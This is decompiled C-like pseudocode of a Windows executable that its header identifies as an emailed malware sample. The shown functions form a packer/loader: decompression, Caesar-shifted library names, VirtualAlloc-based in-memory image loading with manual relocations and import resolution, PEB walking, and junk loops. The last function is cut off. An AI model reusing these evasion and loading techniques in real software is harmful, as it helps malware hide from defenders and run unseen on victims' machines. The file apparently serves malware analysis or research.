// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1196/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 dwArg04)
{
	__align(fp - 0x00000004);
	Mem25[dwArg04 + 0x00000000:byte] = Mem0[0x00405350:byte];
	word32 esi_104 = dwLoc013C;
	word32 ecx_107 = 0x00000000;
	word32 ebx_105 = 0x00000000;
	word32 edx_134 = dwArg04 + 0x00000001;
	word32 edi_102 = 0x00405351;
	word32 dwLoc0148_100 = 0x00000000;
	word32 dwLoc0134_275 = 0x00000000;
	word32 dwLoc0140_101 = dwArg04 + 0x00000001;
	word32 dwLoc0144_130 = 0x00405351;
	do
	{
		ebx_105 = ebx_105 - 0x00000001;
		if (ebx_105 == 0x00000000)
		{
			edi_102 = edi_102 + 0x00000001;
			esi_104 = (word32) Mem25[edi_102 + 0x00000000:byte];
			dwLoc0144_130 = edi_102;
			ebx_105 = ebx_105 + 0x00000007;
		}
		esi_104 = esi_104 * 0x00000002;
		if ((esi_104 >>u 0x00000007 & 0x00000001) != ecx_107)
		{
			word32 ebx_153 = ebx_105 - 0x00000001;
			word32 dwLoc0138_157 = ebx_153;
			if (ebx_105 == 0x00000000)
			{
				edi_102 = edi_102 + 0x00000001;
				esi_104 = (word32) Mem25[edi_102 + 0x00000000:byte];
				ebx_153 = 0x00000007;
				dwLoc0144_130 = edi_102;
				dwLoc0138_157 = 0x00000007;
			}
			word32 esi_172 = esi_104 * 0x00000002;
			if ((esi_104 >>u 0x00000007 & 0x00000001) != 0x00000000)
			{
				ebx_105 = ebx_153 - 0x00000001;
				if (ebx_153 == 0x00000000)
				{
					esi_172 = (word32) Mem25[edi_102 + 0x00000000:byte];
					edi_102 = edi_102 + 0x00000001;
					ebx_105 = ebx_153 + 0x00000007;
				}
				esi_104 = esi_172 * 0x00000002;
				if ((esi_172 >>u 0x00000007 & 0x00000001) != 0x00000000)
				{
					word32 ecx_201 = 0x00000000;
					word32 dwLoc0148_205 = 0x00000004;
					do
					{
						ebx_105 = ebx_105 - 0x00000001;
						if (ebx_105 == 0x00000000)
						{
							esi_104 = (word32) Mem25[edi_102 + 0x00000000:byte];
							edi_102 = edi_102 + 0x00000001;
							ebx_105 = ebx_105 + 0x00000007;
						}
						word32 v26_236 = dwLoc0148_205 - 0x00000001;
						esi_104 = esi_104 * 0x00000002;
						dwLoc0148_205 = v26_236;
						ecx_201 = (esi_104 >>u 0x00000007 & 0x00000001) + ecx_201 * 0x00000002;
					} while (v26_236 != 0x00000000);
					dwLoc0144_130 = edi_102;
					if (ecx_201 != 0x00000000)
					{
						Mem251[edx_134 + 0x00000000:byte] = Mem25[edx_134 - ecx_201:byte];
						edx_134 = edx_134 + 0x00000001;
						dwLoc0148_100 = 0x00000000;
					}
					else
					{
						Mem255[edx_134 + 0x00000000:byte] = 0x00;
						edx_134 = edx_134 + 0x00000001;
						dwLoc0148_100 = 0x00000000;
					}
l004012B0:
					dwLoc0140_101 = edx_134;
				}
				else
				{
					word32 ecx_263 = (word32) Mem25[edi_102 + 0x00000000:byte];
					edi_102 = edi_102 + 0x00000001;
					word32 eax_267 = (ecx_263 & 0x00000001) + 0x00000002;
					dwLoc0144_130 = edi_102;
					if (ecx_263 >>u 0x00000001 == 0x00000000)
					{
						dwLoc0134_275 = 0x00000001;
						goto l004011C4;
					}
					else if (eax_267 != 0x00000000)
					{
						do
						{
							edx_134 = edx_134 + 0x00000001;
							Mem295[edx_134 - 0x00000001:byte] = Mem25[edx_134 - (ecx_263 >>u 0x00000001):byte];
							eax_267 = eax_267 - 0x00000001;
						} while (eax_267 != 0x00000000);
						dwLoc0140_101 = edx_134;
						dwLoc0130 = ecx_263 >>u 0x00000001;
						dwLoc0148_100 = 0x00000001;
					}
					else
					{
l004011C4:
						dwLoc0130 = ecx_263 >>u 0x00000001;
						dwLoc0148_100 = 0x00000001;
					}
				}
			}
			else
			{
				word32 eax_332;
				word32 eax_307 = fn00401AC0(ebx_153, fp - 0x00000144);
				if (dwLoc0148_100 != 0x00000000)
				{
					eax_332 = eax_307 - 0x00000002;
					goto l00401221;
				}
				else if (eax_307 == 0x00000002)
				{
					word32 eax_393 = fn00401AC0(ebx_153, fp - 0x00000144);
					edx_134 = dwLoc0140_101;
					if (eax_393 != 0x00000000)
					{
						do
						{
							edx_134 = edx_134 + 0x00000001;
							Mem409[edx_134 - 0x00000001:byte] = Mem25[edx_134 - dwLoc0130:byte];
							eax_393 = eax_393 - 0x00000001;
						} while (eax_393 != 0x00000000);
						dwLoc0140_101 = edx_134;
					}
				}
				else
				{
					eax_332 = eax_307 - 0x00000003;
l00401221:
					word32 eax_336 = (eax_332 << 0x00000008) + (word32) Mem25[dwLoc0144_130 + 0x00000000:byte];
					dwLoc0144_130 = dwLoc0144_130 + 0x00000001;
					word32 eax_342 = fn00401AC0(ebx_153, fp - 0x00000144);
					if (eax_336 >=u 0x00007D00)
						eax_342 = eax_342 + 0x00000001;
					if (eax_336 >=u 0x00000500)
						eax_342 = eax_342 + 0x00000001;
					if (eax_336 <u 0x00000080)
						eax_342 = eax_342 + 0x00000002;
					edx_134 = dwLoc0140_101;
					if (eax_342 != 0x00000000)
					{
						do
						{
							Mem375[edx_134 + 0x00000000:byte] = Mem25[edx_134 - eax_336:byte];
							edx_134 = edx_134 + 0x00000001;
							eax_342 = eax_342 - 0x00000001;
						} while (eax_342 != 0x00000000);
						dwLoc0140_101 = edx_134;
					}
					dwLoc0130 = eax_336;
				}
				ebx_105 = dwLoc0138_157;
				esi_104 = esi_172;
				edi_102 = dwLoc0144_130;
				dwLoc0148_100 = 0x00000001;
			}
		}
		else
		{
			Mem424[edx_134 + 0x00000000:byte] = Mem25[edi_102 + 0x00000000:byte];
			edi_102 = edi_102 + 0x00000001;
			edx_134 = edx_134 + 0x00000001;
			dwLoc0144_130 = edi_102;
			dwLoc0148_100 = ecx_107;
			goto l004012B0;
		}
		ecx_107 = 0x00000000;
	} while (dwLoc0134_275 == 0x00000000);
	return;
}

word32 fn00401380(word32 ecx, word32 ebx, word32 ebp, word32 edi, ptr32 ecxOut, ptr32 ebxOut, ptr32 ebpOut, ptr32 esiOut, ptr32 ediOut)
{
	word32 ebp_5 = fp - 0x00000004;
	word32 edx_21 = 0x00000015;
	do
		edx_21 = edx_21 - 0x00000001;
	while (edx_21 != 0x00000000);
	CharNextA(fp - 0x00000005);
	fn004018B0(fp - 0x00000014, 0x0000000A, 0x00409780);
	word32 eax_51 = LoadLibraryA(fp - 0x00000014);
	word32 v16_58 = dwLocA8 & eax_51;
	word32 edi_53 = eax_51;
	word32 ebx_61 = DPB(ebx, 0x00, 0, 8) | v16_58;
	word32 eax_63 = GetCurrentThread();
	if (eax_63 == 0x00000000)
		0x00409780();
	word32 esi_80 = 0x00000000;
}

word32 fn004014A0(word32 eax, word32 ecx, word32 ebx, word32 ebp, word32 edi, selector fs)
{
	word32 esi_14 = Mem0[0x00405344:word32];
	word32 ebp_32 = fp - 0x00000004;
	word32 esp_15 = fp - 0x00000274;
	word32 eax_24 = GetCurrentThread();
	if (eax_24 == 0x00000000)
		esi_14();
	word32 ecx_37;
	word32 ebx_38;
	word32 ebp_39;
	word32 esi_40;
	word32 edi_41;
	word32 eax_42 = fn00401380(ecx, ebx, ebp_32, edi, out ecx_37, out ebx_38, out ebp_39, out esi_40, out edi_41);
	word32 v14_44 = Mem0[ebp_39 + 0xFFFFFDCF:word32] & eax_42;
	Mem45[ebp_39 + 0xFFFFFDCF:word32] = v14_44;
	word32 v15_47 = Mem45[ebp_39 + 0xFFFFFDCC:word32] & eax_42;
	Mem48[ebp_39 + 0xFFFFFDCC:word32] = v15_47;
	word32 eax_50 = Mem48[esi_40 + 0x0000003C:word32];
	word32 ecx_51 = (word32) Mem48[eax_50 + 0x00000016 + esi_40:word16];
	word32 edx_52 = Mem48[eax_50 + 0x000000C0 + esi_40:word32];
	Mem55[ebp_39 - 0x00000033:byte] = 0x67;
	Mem56[ebp_39 - 0x00000030:byte] = 0x67;
	Mem58[ebp_39 - 0x0000002F:byte] = 0x6E;
	Mem59[ebp_39 - 0x0000002A:byte] = 0x6E;
	Mem60[ebp_39 - 0x00000029:byte] = 0x6E;
	Mem64[ebp_39 - 0x00000038:word32] = edx_52;
	Mem65[ebp_39 - 0x00000028:byte] = 0x00;
	Mem66[ebp_39 - 0x00000018:byte] = 0x00;
	Mem67[ebp_39 - 0x00000010:word32] = ecx_51;
	Mem72[ebp_39 - 0x00000034:byte] = 0x6D;
	Mem73[ebp_39 - 0x00000032:byte] = 0x74;
	Mem74[ebp_39 - 0x00000031:byte] = 0x70;
	Mem75[ebp_39 - 0x0000002E:byte] = 0x31;
	Mem76[ebp_39 - 0x0000002D:byte] = 0x30;
	Mem77[ebp_39 - 0x0000002C:byte] = 0x2C;
	Mem78[ebp_39 - 0x0000002B:byte] = 0x66;
	fn004018B0(ebp_39 - 0x00000024, 0x00000018, ebp_39 - 0x00000034);
	word32 esp_80 = esp_15 - 0x00000004;
	Mem81[esp_80 + 0x00000000:word32] = ebp_39 - 0x00000024;
	word32 eax_82 = LoadLibraryA(Mem81[esp_80 + 0x00000000:LPCSTR]);
	Mem85[esp_80 + 0x00000000:word32] = 0xC5FF2F46;
	word32 ecx_88;
	word32 edx_89;
	word32 esi_91;
	word32 edi_92;
	word32 ebp_137;
	word32 eax_93 = fn00401C20(eax_82, ebp_39, esi_40, edi_41, ebp, dwArg00, out ecx_88, out edx_89, out ebp_137, out esi_91, out edi_92);
	Mem98[esp_80 + 0x00000000:word32] = ebp_137 - 0x0000000C;
	Mem100[esp_80 - 0x00000004:word32] = 0x00000040;
	Mem102[esp_80 - 0x00000008:word32] = 0x00006200;
	Mem104[esp_80 - 0x0000000C:word32] = esi_91;
	eax_93();
	Mem117[ebp_137 + 0xFFFFFEE3:word32] = eax_93;
	Mem120[esp_80 - 0x00000010:word32] = 0x00000000;
	word32 edi_118 = GetModuleHandleA;
	word32 eax_121 = GetModuleHandleA(Mem120[esp_80 - 0x00000010:LPCSTR]);
	word32 esp_122 = esp_80 - 0x0000000C;
	if (eax_121 == 0x00000000)
		ebp_137();
	word32 esi_143 = Mem120[ebp_137 - 0x00000014:word32];
	word32 esp_144 = esp_122 - 0x00000004;
	Mem145[esp_144 + 0x00000000:word32] = esi_143;
	fn00401000(dwArg00);
	word32 eax_148 = esi_143;
	word32 ecx_150 = 0x0000187F;
	do
	{
		word32 v18_153 = Mem145[eax_148 + 0x00000000:word32] + 0x00004DF4;
		Mem154[eax_148 + 0x00000000:word32] = v18_153;
		eax_148 = eax_148 + 0x00000004;
		ecx_150 = ecx_150 - 0x00000001;
	} while (ecx_150 != 0x00000000);
	Mem161[esp_144 + 0x00000000:word32] = ecx_150;
	word32 esp_160 = esp_144;
	edi_118();
	Mem163[ebp_137 + 0xFFFFFE6A:word32] = Mem161[ebp_137 + 0xFFFFFE6A:word32] - eax_148;
	word16 dx_166 = Mem163[ebp_137 - 0x00000010:word16];
	word32 edi_167 = Mem163[esi_143 + 0x0000003C:word32] + esi_143;
	Mem168[edi_167 + 0x000000C0:word32] = Mem163[ebp_137 - 0x00000038:word32];
	word32 eax_169 = Mem168[edi_167 + 0x000000A0:word32];
	Mem174[ebp_137 + 0xFFFFFF58:word32] = edi_167;
	Mem175[edi_167 + 0x00000016:word16] = dx_166;
	if (eax_169 != 0x00000000)
	{
		word32 esi_420 = eax_169 + Mem175[0x00405344:word32];
		Mem422[ebp_137 - 0x0000003C:word32] = Mem175[ebp_137 - 0x0000003C:word32] & eax_169;
		Mem426[esp_144 - 0x00000004:word32] = ebp_137 - 0x00000010;
		Mem427[ebp_137 - 0x00000010:byte] = 0x00;
		CharNextA(Mem427[esp_144 - 0x00000004:LPCSTR]);
		esp_160 = esp_144;
		word32 edx_432 = Mem427[0x00405344:word32] - Mem427[edi_167 + 0x00000034:word32];
		word32 ecx_435 = 0x00000162;
		word32 ebx_436 = 0x0000000A;
		do
		{
			ecx_435 = ecx_435 - 0x00000003;
			Mem445[ebp_137 - 0x00000014:word32] = ecx_435;
			if (ecx_435 != 0x00000000)
			{
				Mem496[ebp_137 - 0x00000014:word32] = 0x00000003;
				ecx_435 = 0x00000003;
			}
			ebx_436 = ebx_436 - 0x00000001;
		} while (ebx_436 != 0x00000000);
		if (Mem445[esi_420 + 0x00000000:word32] != ebx_436)
		{
			esp_160 = esp_144;
			do
			{
				word32 eax_459 = Mem445[esi_420 + 0x00000004:word32];
				word32 ecx_465 = esi_420 + 0x00000008;
				if (eax_459 - 0x00000008 >>u 0x00000001 > 0x00000000)
				{
					Mem473[ebp_137 - 0x00000014:word32] = eax_459 - 0x00000008 >>u 0x00000001;
					do
					{
						word32 eax_475 = (word32) Mem473[ecx_465 + 0x00000000:word16];
						if ((eax_475 & 0x0000F000) == 0x00003000)
						{
							word32 eax_491 = (eax_475 & 0x00000FFF) + Mem473[esi_420 + 0x00000000:word32] + Mem473[0x00405344:word32];
							Mem493[eax_491 + 0x00000000:word32] = Mem473[eax_491 + 0x00000000:word32] + edx_432;
						}
						word32 v26_484 = Mem473[ebp_137 - 0x00000014:word32] - 0x00000001;
						Mem485[ebp_137 - 0x00000014:word32] = v26_484;
						ecx_465 = ecx_465 + 0x00000002;
					} while (v26_484 != 0x00000000);
				}
				esi_420 = esi_420 + Mem445[esi_420 + 0x00000004:word32];
			} while (Mem445[esi_420 + 0x00000000:word32] != 0x00000000);
		}
	}
	if (Mem175[edi_167 + 0x00000080:word32] != 0x00000000)
	{
		word32 esp_269 = esp_160 - 0x00000004;
		Mem270[esp_269 + 0x00000000:word32] = 0x00000000;
		CloseHandle(Mem270[esp_269 + 0x00000000:HANDLE]);
		word32 ebx_274 = Mem270[edi_167 + 0x00000080:word32] + Mem270[0x00405344:word32];
		Mem277[ebp_137 - 0x00000010:word32] = ebx_274;
		if (Mem279[ebx_283 + 0x00000010:word32] != 0x00000000)
		{
			do
			{
				word32 esp_298 = esp_160 - 0x00000004;
				Mem299[esp_298 + 0x00000000:word32] = Mem286[ebx_283 + 0x0000000C:word32] + Mem286[0x00405344:word32];
				if (eax_309 != 0x00000000)
				{
					word32 ebx_349;
					Mem334[ebp_137 - 0x0000003C:word32] = Mem308[ebp_137 - 0x0000003C:word32] ^ Mem308[ebp_137 - 0x0000003C:word32];
					if (eax_344 != 0x00000000)
						ebx_349 = eax_344;
					else
						ebx_349 = Mem342[ebx_283 + 0x00000010:word32];
					word32 eax_350 = Mem342[0x00405344:word32];
					word32 ebx_353 = ebx_349 + eax_350;
					word32 eax_355 = Mem342[ebx_353 + 0x00000000:word32];
					word32 esi_354 = Mem342[Mem342[ebp_137 - 0x00000010:word32] + 0x00000010:word32] + eax_350;
					byte S_359 = cond(eax_355);
					if (eax_355 != 0x00000000)
						do
						{
							word32 edx_390;
							if (!S_359)
							{
								Mem409[ebp_137 + 0xFFFFFDA4:word32] = Mem342[ebp_137 + 0xFFFFFDA4:word32] & eax_355;
								edx_390 = (word32) Mem409[ebx_353 + 0x00000000:word16];
							}
							else
								edx_390 = eax_355 + 0x00000002 + Mem342[0x00405344:word32];
							word32 esp_392 = esp_160 - 0x00000004;
							Mem393[esp_392 + 0x00000000:word32] = edx_390;
							Mem395[esp_392 - 0x00000004:word32] = eax_309;
							Mem399[esi_354 + 0x00000000:word32] = GetProcAddress(Mem395[esp_392 - 0x00000004:HMODULE], Mem395[esp_392 + 0x00000000:LPCSTR]);
							ebx_353 = ebx_353 + 0x00000004;
							eax_355 = Mem399[ebx_353 + 0x00000000:word32];
							esp_160 = esp_392 + 0x00000004;
							esi_354 = esi_354 + 0x00000004;
							S_359 = cond(eax_355);
						} while (eax_355 != 0x00000000);
					ebx_283 = Mem342[ebp_137 - 0x00000010:word32];
				}
				ebx_283 = ebx_283 + 0x00000014;
				Mem329[ebp_137 - 0x00000010:word32] = ebx_283;
			} while (Mem308[ebx_283 + 0x00000010:word32] != 0x00000000);
			edi_167 = Mem329[ebp_137 + 0xFFFFFF58:word32];
		}
	}
	word32 eax_201 = Mem175[edi_167 + 0x00000028:word32] + Mem175[0x00405344:word32];
	Mem203[ebp_137 - 0x00000008:word32] = 0x00000000;
	Mem204[0x0040534C:word32] = eax_201;
	word32 esp_205 = esp_160 - 0x00000004;
	Mem206[esp_205 + 0x00000000:word32] = eax_201;
	Mem208[ebp_137 - 0x00000008:word32] = Mem206[fs:0x00000030:word32];
	word32 edi_213 = Mem208[Mem208[Mem208[ebp_137 - 0x00000008:word32] + 0x0000000C:word32] + 0x0000000C:word32];
	word32 eax_214 = Mem208[0x00405344:word32];
	do
		edi_213 = Mem208[edi_213 + 0x00000000:word32];
	while (Mem208[edi_213 + 0x00000018:word32] != eax_214);
	Mem223[esp_205 + 0x00000000:word32] = ebp_137 - 0x00000004;
	Mem224[ebp_137 - 0x00000004:byte] = 0x00;
	word32 eax_225 = CharNextA(Mem224[esp_205 + 0x00000000:LPCSTR]);
	Mem229[ebp_137 - 0x0000005F:word32] = Mem224[ebp_137 - 0x0000005F:word32] & eax_225;
	Mem232[ebp_137 - 0x0000005D:word32] = Mem229[ebp_137 - 0x0000005D:word32] | eax_225;
	Mem238[edi_213 + 0x0000001C:word32] = Mem232[0x0040534C:word32];
	word32 ecx_239 = 0x000003B3;
	word32 edx_240 = 0x0000000A;
	do
	{
		ecx_239 = ecx_239 + 0x00000002;
		Mem251[ebp_137 - 0x00000014:word32] = ecx_239;
		if (ecx_239 == 0x00000000)
		{
			Mem268[ebp_137 - 0x00000014:word32] = 0x00000001;
			ecx_239 = 0x00000001;
		}
		edx_240 = edx_240 - 0x00000001;
	} while (edx_240 != 0x00000000);
	return ecx_239;
}

void fn004017A0(word32 ebx, word32 edi)
{
	if (GetMessageA(fp - 0x0000001C, 0x00000000, 0x00000000, 0x00000000) != 0x00000000)
	{
		Mem41[fp - 0x00000024:word32] = ebx;
		Mem44[fp - 0x00000028:word32] = edi;
		do
		{
			Mem49[fp - 0x0000002C:word32] = fp - 0x0000001C;
			TranslateMessage(0x00000000);
			Mem54[fp - 0x0000002C:word32] = fp - 0x0000001C;
			DispatchMessageA(0x00000000);
			Mem58[fp - 0x0000002C:word32] = 0x00000000;
			Mem62[fp - 0x00000034:word32] = 0x00000000;
		} while (GetMessageA(fp - 0x0000001C, 0x00000000, 0x00000000, 0x00000000) != 0x00000000);
	}
	return;
}

void fn00401800(word32 ebx, word32 edi, selector fs)
{
	word32 ebp_46 = fp - 0x00000004;
	word32 eax_107 = 0x0000035E;
	word32 edx_12 = 0x00000031;
	do
	{
		eax_107 = eax_107 - 0x0000000A;
		word32 dwLoc08_108 = eax_107;
		if (eax_107 == 0x00000000)
		{
			eax_107 = 0x00000008;
			dwLoc08_108 = 0x00000008;
		}
		word32 ecx_22 = dwLoc08_108;
		edx_12 = edx_12 - 0x00000001;
	} while (edx_12 != 0x00000000);
	word32 eax_34 = RegQueryValueA(edx_12, edx_12, edx_12, edx_12);
	word32 esp_35 = fp - 0x0000000C;
	if (eax_34 != 0x00000006)
		(fp - 0x00000004)();
	word32 ecx_50;
	if (fn00401920(eax_34, ecx_22, ebx, edi, out ecx_50) != 0x00000000)
	{
		word32 esp_84 = esp_35 - 0x00000004;
		Mem85[esp_84 + 0x00000000:word32] = 0x00000042;
		word32 eax_86 = GetKeyState(Mem85[esp_84 + 0x00000000:int32]);
		word32 ecx_103 = 0x0000033B;
		word32 edx_89 = 0x00000006;
		do
		{
			ecx_103 = ecx_103 >>u 0x00000008;
			Mem96[ebp_46 - 0x00000004:word32] = ecx_103;
			if (ecx_103 == 0x00000000)
			{
				Mem104[ebp_46 - 0x00000004:word32] = 0x00000008;
				ecx_103 = 0x00000008;
			}
			eax_86 = eax_86 ^ Mem96[ebp_46 - 0x00000004:word32];
			edx_89 = edx_89 - 0x00000001;
		} while (edx_89 != 0x00000000);
		fn004014A0(eax_86, ecx_103, ebx, ebp_46, edi, fs);
	}
	word32 eax_59 = 0x000002D6;
	word32 edx_60 = 0x0000004C;
	do
	{
		eax_59 = eax_59 - 0x00000007;
		Mem67[ebp_46 - 0x00000004:word32] = eax_59;
		if (eax_59 == 0x00000000)
		{
			Mem83[ebp_46 - 0x00000004:word32] = 0x00000009;
			eax_59 = 0x00000009;
		}
		edx_60 = edx_60 - 0x00000001;
	} while (edx_60 != 0x00000000);
	Mem81[ebp_46 + 0x00000004 - 0x00000004:word32] = Mem67[0x0040534C:word32];
	return;
}

void fn004018B0(word32 eax, word32 ecx, word32 edx)
{
	word32 esi_58 = edx;
	word32 edi_11 = eax;
	byte al_13 = Mem0[edx + 0x00000000:byte];
	if (al_13 != 0x00)
	{
		byte cl_48 = (byte) ecx;
		do
		{
			byte al_111;
			if (al_13 - 0x41 <=u 0x19)
				al_111 = (byte) ((int64) ((int32) al_13 - 0x00000041 + ecx) % 0x0000001A) + 0x41;
			else if (al_13 - 0x61 <=u 0x19)
				al_111 = (byte) ((int64) ((int32) al_13 - 0x00000061 + ecx) % 0x0000001A) + 0x61;
			else
				al_111 = al_13 ^ 0x1A - cl_48;
			Mem73[edi_11 + 0x00000000:byte] = al_111;
			esi_58 = esi_58 + 0x00000001;
			al_13 = Mem73[esi_58 + 0x00000000:byte];
			edi_11 = edi_11 + 0x00000001;
		} while (al_13 != 0x00);
	}
	return;
}

word32 fn00401920(word32 eax, word32 ecx, word32 ebx, word32 edi, ptr32 ecxOut)
{
	*ecxOut = ecx;
	word32 ebp_5 = fp - 0x00000004;
	word32 edi_21 = edi - dwLoc0138;
	word32 eax_30 = RegQueryValueA(0x00000000, 0x00000000, 0x00000000, 0x00000000);
	if (eax_30 != 0x00000006)
		ecx();
	if (Mem0[0x00405340:word32] != 0x00000000)
		return 0x00000001;
	else
	{
		word32 eax_116;
		Mem79[0x00405340:word32] = 0x00000001;
		Mem82[fp - 0x00000164:word32] = 0x00401920;
		word32 ecx_83;
		word32 ebx_84;
		word32 esi_86;
		word32 edi_87;
		word32 ebp_164;
		fn00401380(ecx, ebx, ebp_5, edi_21, out ecx_83, out ebx_84, out ebp_164, out esi_86, out edi_87);
		Mem91[0x00405344:word32] = Mem82[fp - 0x00000164:word32];
		Mem92[0x00405344:word16] = 0x0000;
		word32 ecx_93 = Mem92[0x00405344:word32];
		word32 eax_94 = Mem92[ecx_93 + 0x0000003C:word32];
		word32 esi_253 = Mem92[eax_94 + 0x00000050 + ecx_93:word32];
		Mem97[fp - 0x00000164:word32] = 0x00000040;
		Mem100[fp - 0x00000168:word32] = 0x00001000;
		Mem102[fp - 0x0000016C:word32] = esi_253;
		Mem104[fp - 0x00000170:word32] = 0x00000000;
		Mem105[ebp_164 - 0x00000008:word32] = eax_94 + ecx_93;
		word32 eax_107 = VirtualAlloc(Mem105[fp - 0x00000170:LPVOID], Mem105[fp - 364:SIZE_T], Mem105[fp - 360:DWORD], Mem105[fp - 356:DWORD]);
		Mem113[0x00405348:word32] = eax_107;
		word32 ebx_106 = 0x00403000;
		word32 esp_108 = fp - 0x00000160;
		eax_116 = eax_107;
		if (true)
		{
			word32 ecx_249 = eax_107;
			eax_116 = Mem113[0x00405344:word32] - eax_107;
			do
			{
				Mem255[ecx_249 + 0x00000000:byte] = Mem113[eax_116 + ecx_249:byte];
				ecx_249 = ecx_249 + 0x00000001;
				esi_253 = esi_253 - 0x00000001;
			} while (esi_253 != 0x00000000);
		}
		word32 edi_118 = eax_107 - Mem113[0x00405344:word32];
		if (Mem113[0x00403000:word32] != 0x00000000)
		{
			Mem192[ebp_164 - 0x00000004:word32] = 0x000001C5;
			do
			{
				word32 ecx_201 = 0x0000000D;
				do
					ecx_201 = ecx_201 - 0x00000001;
				while (ecx_201 != 0x00000000);
				eax_116 = Mem192[ebx_106 + 0x00000004:word32] - 0x00000008 >>u 0x00000001;
				word32 ecx_213 = ebx_106 + 0x00000008;
				if (eax_116 != 0x00000000)
				{
					word32 edx_223 = eax_116;
					do
					{
						eax_116 = (word32) Mem192[ecx_213 + 0x00000000:word16];
						if ((eax_116 & 0x0000F000) == 0x00003000)
						{
							eax_116 = (eax_116 & 0x00000FFF) + Mem192[ebx_106 + 0x00000000:word32] + Mem192[0x00405348:word32];
							Mem246[eax_116 + 0x00000000:word32] = Mem192[eax_116 + 0x00000000:word32] + edi_118;
						}
						ecx_213 = ecx_213 + 0x00000002;
						edx_223 = edx_223 - 0x00000001;
					} while (edx_223 != 0x00000000);
				}
				ebx_106 = ebx_106 + Mem192[ebx_106 + 0x00000004:word32];
			} while (Mem192[ebx_106 + 0x00000000:word32] != 0x00000000);
		}
		word32 ecx_128 = 0x00000152;
		word32 edx_129 = 0x0000000A;
		do
		{
			ecx_128 = ecx_128 >>u 0x00000003;
			Mem136[ebp_164 - 0x00000004:word32] = ecx_128;
			eax_116 = eax_116 - Mem136[ebp_164 - 0x00000004:word32];
			edx_129 = edx_129 - 0x00000001;
		} while (edx_129 != 0x00000000);
		Mem143[ebp_164 + 0xFFFFFF64:word32] = eax_116;
		Mem144[ebp_164 + 0xFFFFFF77:word32] = eax_116;
		word32 esp_145 = esp_108 - 0x00000004;
		Mem146[esp_145 + 0x00000000:word32] = edx_129;
		Mem148[esp_145 - 0x00000004:word32] = edx_129;
		Mem150[esp_145 - 0x00000008:word32] = edx_129;
		Mem152[esp_145 - 0x0000000C:word32] = edx_129;
		word32 eax_153 = RegQueryValueA(Mem152[esp_145 - 0x0000000C:HKEY], Mem152[esp_145 - 8:LPCSTR], Mem152[esp_145 - 4:LPSTR], Mem152[esp_145 + 0x00000000:PLONG]);
		if (eax_153 != 0x00000006)
		{
			word32 edi_186 = edi_118 - Mem152[ebp_164 - 0x00000039:word32];
			word32 v17_187 = Mem152[ebp_164 - 0x00000043:word32] - eax_153;
			Mem188[ebp_164 - 0x00000043:word32] = v17_187;
			edi_186();
		}
		Mem168[ebp_164 + 0xFFFFFF02:word32] = Mem152[ebp_164 + 0xFFFFFF02:word32] & eax_153;
		word32 ecx_172 = Mem168[Mem168[ebp_164 - 0x00000008:word32] + 0x00000028:word32] + Mem168[0x00405348:word32];
		*ecxOut = ecx_172;
		Mem173[0x0040534C:word32] = ecx_172;
		return 0x00000000;
	}
}

word32 fn00401AC0(word32 ebx, word32 esi)
{
	word32 ecx_18 = Mem0[esi + 0x0000000C:word32];
	word32 eax_22 = Mem0[esi + 0x00000008:word32];
	word32 edi_14 = 0x00000001;
	do
	{
		word32 ecx_26 = ecx_18 - 0x00000001;
		if (ecx_18 == 0x00000000)
		{
			word32 ecx_81 = Mem0[esi + 0x00000000:word32];
			eax_22 = (word32) Mem0[ecx_81 + 0x00000000:byte];
			Mem85[esi + 0x00000000:word32] = ecx_81 + 0x00000001;
			ecx_26 = ecx_18 + 0x00000007;
		}
		edi_14 = (eax_22 >>u 0x00000007 & 0x00000001) + edi_14 * 0x00000002;
		word32 eax_43 = eax_22 * 0x00000002;
		ecx_18 = ecx_26 - 0x00000001;
		if (ecx_26 == 0x00000000)
		{
			word32 ecx_75 = Mem0[esi + 0x00000000:word32];
			eax_43 = (word32) Mem0[ecx_75 + 0x00000000:byte];
			Mem79[esi + 0x00000000:word32] = ecx_75 + 0x00000001;
			ecx_18 = ecx_26 + 0x00000007;
		}
		eax_22 = eax_43 * 0x00000002;
	} while ((eax_43 >>u 0x00000007 & 0x00000001) != 0x00000000);
	Mem63[esi + 0x0000000C:word32] = ecx_18;
	Mem64[esi + 0x00000008:word32] = eax_22;
	return edi_14;
}

word32 fn00401C20(word32 ebx, word32 ebp, word32 esi, word32 edi, word32 dwArg00, word32 dwArg04, ptr32 ecxOut, ptr32 edxOut, ptr32 ebpOut, ptr32 esiOut, ptr32 ediOut)
{
// def fp
// def ebp
// def esi
// def edi
// def eax
// def ebx
// def Mem0
// def dwLoc0142
// def dwLoc53
// def dwLoc018D
// def dwLoc018E
// def dwLoc10
// def Z
// def edx
// def SO
// def ecxOut
// def edxOut
// def ebpOut
// def esiOut
// def ediOut
// def dwArg00
// def dwArg04
	esp_1 = fp;
	esp_2 = fp - 0x00000004;
	dwLoc04_4 = ebp;
	ebp_5 = fp - 0x00000004;
	esp_6 = fp - 0x0000019C;
	esp_7 = fp - 0x000001A0;
	dwLoc01A0_9 = esi;
	esp_10 = fp - 0x000001A4;
	dwLoc01A4_12 = edi;
	dwLocB2_14 = eax;
	esi_16 = esi & ebx;
	eax_18 = Mem0[ebx + 0x0000003C:word32];
	eax_19 = eax_18 + ebx;
	esi_20 = esi_16 ^ edi;
	dwLoc0140_21 = eax_19;
	edi_23 = edi & dwLoc0142;
	edi_24 = Mem0[eax_19 + 0x00000078:word32];
	eax_25 = Mem0[edi_24 + 0x00000024 + ebx:word32];
	edi_26 = edi_24 + ebx;
	eax_27 = eax_25 + ebx;
	dwLoc14_28 = eax_27;
	eax_29 = eax_27 & ebx;
	v11_31 = dwLoc53 + eax_29;
	dwLoc53_32 = v11_31;
	ecx_33 = fp - 0x00000004;
	esp_34 = fp - 0x000001A8;
	dwLoc01A8_35 = 0x00000000;
	esp_36 = fp - 0x000001AC;
	dwLoc01AC_37 = 0x00000000;
	eax_38 = GetProcAddress(dwLoc01AC_37, dwLoc01A8_35);
	esp_39 = fp - 0x000001A4;
	eax_40 = eax_38 & fp - 0x00000004;
	eax_42 = eax_40 + dwLoc018D;
	eax_43 = Mem0[edi_26 + 0x00000020:word32];
	ecx_44 = Mem0[edi_26 + 0x0000001C:word32];
	eax_45 = eax_43 + ebx;
	al_46 = (byte) eax_45;
	ecx_47 = ecx_44 + ebx;
	SCZO_48 = cond(Mem0[edi_26 + 0x00000018:word32] - 0x00000000);
	SZO_49 = SCZO_48;
	dwLoc18_50 = eax_45;
	dwLoc0C_51 = ecx_47;
	dwLoc08_52 = 0x00000000;
